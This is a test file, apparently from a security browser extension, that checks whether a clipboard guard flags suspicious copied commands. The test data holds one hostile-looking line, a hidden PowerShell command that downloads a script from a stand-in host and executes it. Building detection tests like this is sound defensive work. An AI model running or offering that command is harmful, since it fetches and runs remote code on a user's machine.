import { describe, it, expect, vi } from "vitest";
import { ClipboardGuard } from "../../src/content/clipboard-guard";
import type { ThreatSignal } from "../../src/shared/types/signal";

describe("Clipboard Guard", () => {
  it("dispatches CLIPBOARD_MANIPULATION threat signal when suspicious copy event is triggered", () => {
    let capturedSignal: ThreatSignal | null = null;

    ClipboardGuard.initialize({
      onThreatDetected: (signal) => {
        capturedSignal = signal;
      },
    });

    // Simulate custom event sent from MAIN world monitor
    const customEvent = new CustomEvent("clickshield:suspicious-copy", {
      detail: {
        timestamp: Date.now(),
        hasCommandSyntax: true,
        snippet: "powershell -w hidden irm http://test.xyz/script | iex",
      },
    });

    window.dispatchEvent(customEvent);

    expect(capturedSignal).not.toBeNull();
    expect(capturedSignal?.type).toBe("CLIPBOARD_MANIPULATION");
    expect(capturedSignal?.snippet).toContain("powershell");
  });
});

